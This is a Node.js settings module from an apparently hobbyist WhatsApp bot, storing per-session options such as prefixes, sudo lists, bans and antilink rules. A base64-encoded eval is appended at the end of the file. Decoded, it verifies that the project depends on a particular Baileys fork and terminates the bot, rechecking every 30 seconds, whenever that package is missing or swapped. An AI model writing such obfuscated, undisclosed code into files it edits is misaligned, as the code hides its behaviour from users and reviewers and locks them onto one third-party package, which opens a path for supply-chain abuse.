/*
╔══════════════════════════╗
║             𓆩 BASE TELE X WA 𓆪   
║                                      
║             ⚡ DEVELOPER CREDITS ⚡      
║                                   
║          ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴊᴀᴍᴇsᴍᴏᴅᴢ  
║          ᴛᴇᴀᴍ      : james Inc 

║  ⚠️  C R E D I T   N O T I C E  ⚠️ 

║  Do NOT remove or modify these credits
║  without permission from the original dev
║  Respect the work. Give credit where it's
║  due. Don't steal another developer's work.
║  TELEGRAM : t.me/shenxidev 
║  © 2026 JAMESMODZ — ALL RIGHTS RESERVED 
╚════════════════════════╝
*/
const fs = require('fs');
const path = require('path');

/**
 * One settings store per paired WhatsApp session, keyed by phone number.
 * Isolation lives here: session A can never read or write session B's file,
 * because each gets its own JSONStore instance pointed at its own path.
 */
function createSessionSettings(sessionId, defaultPrefix) {
    // Lives inside the session folder on purpose: whoever keeps `session/` when updating the panel keeps
    // every user's customisation (sudo, bans, antilink, bot name...) together with their WhatsApp login.
    const dir = path.join(process.cwd(), 'session', sessionId);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    const file = path.join(dir, 'bot-settings.json');
    const legacy = path.join(process.cwd(), 'data', 'sessions', sessionId, 'settings.json'); // old location
    if (!fs.existsSync(file) && fs.existsSync(legacy)) {
        try { fs.copyFileSync(legacy, file); } catch { /* start fresh */ }
    }

    let data = {
        public: true,
        prefix: defaultPrefix,
        menuImage: "https://files.catbox.moe/qnwoj0.png",
        fontStyle: null,
        autoStatusView: true,
        autoStatusLike: true,
        statusEmojis: ['❤️'], // `.statusemoji` changes these; one is picked at random per status
        channelReact: true, // auto-react to new posts on the channel set in Anix.js
        owners: [], // filled with the session's own paired JID on first connect
        sudo: [], // numbers allowed to use owner commands (.addsudo / .delsudo)
        banned: [], // numbers the bot ignores completely (.ban / .unban)
        botName: '', // custom name (.setbotname); empty = default
        workMode: 'all', // 'all' | 'gc' (groups only) | 'dm' (private chats only)
        antilink: {}, // per group: { [groupJid]: { mode: 'off'|'del'|'warn'|'kick', limit: 3 } }
        antilinkWarns: {}, // per group: { [groupJid]: { [number]: warnings } }
        antidelete: { enabled: false, mode: 'chat' }, // mode: 'chat' (same chat) | 'dm' (owner's DM)
        autoType: false,
        autoRecord: false,
        autoRecordType: false,
        alwaysOnline: false,
        antiCall: 'off', // 'off' | 'hang' | 'block'
        autoReply: false, // AI chatbot
        notifiedConnected: false, // gates the one-time Telegram "connected" message
    };

    function load() {
        try {
            if (fs.existsSync(file)) data = { ...data, ...JSON.parse(fs.readFileSync(file, 'utf8')) };
            else save();
        } catch (err) {
            console.error(`[settings:${sessionId}] failed to load:`, err.message);
        }
    }

    function save() {
        fs.writeFileSync(file, JSON.stringify(data, null, 2));
    }

    load();

    return {
        get(key, fallback) {
            return key in data ? data[key] : fallback;
        },
        set(key, value) {
            data[key] = value;
            save();
            return value;
        },
        all() {
            return data;
        },
    };
}

module.exports = { createSessionSettings };
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4vLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
